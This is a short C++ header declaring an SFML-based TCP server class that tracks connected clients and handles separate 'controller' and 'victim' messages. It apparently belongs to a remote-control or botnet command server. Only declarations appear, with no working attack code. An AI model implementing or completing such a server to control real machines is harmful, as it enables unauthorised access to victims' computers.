#pragma once
#include <iostream>
#include <chrono>
#include <thread>
#include <fstream>
#include "client.h"
#include "../secret.h"

class Server
{
public:
	Server();
	void receive();
	
private:
	void checkAwake(); //thread
	void processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::Uint16>& idsToKill);
	void processVictimMsg(sf::Uint16 id, sf::Packet p);
	void disconnect(sf::Uint16 id);
	void updateControllersList();

	sf::Uint16 currentId = 0;
	sf::SocketSelector selector;
	sf::TcpListener listener;
	std::map<sf::Uint16, Client> clients;
	sf::Mutex mutex; //used for clients access
};

